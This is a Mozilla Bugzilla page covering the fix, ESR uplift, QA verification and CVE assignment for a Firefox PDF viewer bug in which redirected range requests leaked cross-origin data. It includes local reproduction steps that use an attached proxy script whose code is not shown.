[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

Approved for 78.7esr.

[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: approval-mozilla-esr78? → approval-mozilla-esr78+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1683940#c16)• 4 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr78/rev/fe1c27998c73>

[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=fixed)

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2034269_458186)• 4 years ago |

QA Whiteboard: [qa-triaged]

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2040391_458186)• 4 years ago |

QA Whiteboard: [qa-triaged] → [qa-triaged][post-critsmash-triage]

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1683940#c17)• 4 years ago |
|  | |

I've tried to reproduce this bug by loading a large pdf file, as per instructions from [comment 11](/show_bug.cgi?id=1683940#c11 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"), but I didn't see any difference between an affected Nightly build (86.0a1, 2020-12-22) and Beta 85.0b9. The pdf's were displayed correctly with both builds, on macOS 10.15 and Win 10.

Hi Brendan, is there any testcase or a PoC available, that can be shared in order to reproduce this issue?

Flags: needinfo?(bdahl)

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1683940#c18)• 4 years ago |
| str | |

Attached file
[str-proxy.js](attachment.cgi?id=9197753)
— [Details](attachment.cgi?id=9197753&action=edit)

[comment 11](/show_bug.cgi?id=1683940#c11 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests")'s STR is about verifying that the fix doesn't cause regressions, but it doesn't trigger the bug and is not deterministic either.

STR for QA:

1. Download the attached Node.js script and start it ( `node str-proxy.js` from the terminal)

   (the script is a proxy (to the large PDF from [comment 11](/show_bug.cgi?id=1683940#c11 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests")), that redirects all range requests)
2. Open the developer tools of Firefox. Open the Network tab and change the "No throttling" dropdown in the upper-right corner to "Good 3G".
3. Visit `http://127.0.0.1:8081/test.pdf`
4. Wait a little bit (a few seconds).
5. Look at the output of the program from step 1. (this will print all requests, including the `Range` requests in particular)
6. Wait for the progress bar to crawl to the end, and check if the PDF is loaded.

Expected:

* step 5 should end with "redirecting response to ?redirTarget", and NOT be followed by `TEST FAILED: Redirect was unexpectedly followed`.
* step 6 should not be displaying any PDF at first. The PDF should only be rendered upon completion (based on the server response from the initial load at step 3).

Actual:

* Step 5 contains several `TEST FAILED: Redirect was unexpectedly followed` lines in the output.
* Step 6 renders the PDF file soon after the initial load, which shows that the redirect was followed
Flags: needinfo?(bdahl)

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1683940#c19)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1683940&comment_id=15222969 "1 revision") |
|  | |

Thanks Rob, for the detailed steps.

I have reproduced this bug using an affected Nightly build (2020-12-22), on macOS 10.15.

This is verified as fixed on Beta 85.0b9, latest Nightly 86.0a1 and 78.7esr, across platforms: Win 10 x64, macOS 10.15 and Ubuntu 20.04 x64.

Status: RESOLVED → VERIFIED
[status-firefox85](/buglist.cgi?f1=cf_status_firefox85&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=verified)
[status-firefox86](/buglist.cgi?f1=cf_status_firefox86&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=verified)
[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=verified)Flags: qe-verify+

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2471336_428608)• 4 years ago |

Whiteboard: [adv-main85+r]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2471785_428608)• 4 years ago |

Whiteboard: [adv-main85+r] → [adv-main85+][adv-esr78.7+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1683940#c20)• 4 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9198101) (obsolete)
— [Details](attachment.cgi?id=9198101&action=edit)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1683940#c21)• 4 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9198137)
— [Details](attachment.cgi?id=9198137&action=edit)

[Attachment #9198101](/attachment.cgi?id=9198101&action=edit "advisory.txt") -
Attachment is obsolete: true

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1683940#c22)• 4 years ago |
|  | |

As part of a security bug pattern analysis, we are requesting your help with a high level analysis of this bug. It is our hope to develop static analysis (or potentially runtime/dynamic analysis) in the future to identify classes of bugs.

Please visit [this google form](https://docs.google.com/forms/d/e/1FAIpQLSe9uRXuoMK6tRglbNL5fpXbun_oEb6_xC2zpuE_CKA_GUjrvA/viewform?usp=pp_url&entry.2124261401=https%3A%2F%2Fbugzilla.mozilla.org%2Fshow_bug.cgi%3Fid%3D1683940) to reply.

Flags: needinfo?(bdahl)Whiteboard: [adv-main85+][adv-esr78.7+] → [adv-main85+][adv-esr78.7+][sec-survey]

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2503105_425126)• 4 years ago |

Flags: needinfo?(bdahl)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a2554647_428608)• 4 years ago |

Alias: CVE-2021-23953

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a8925320_1689)• 4 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1683940&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


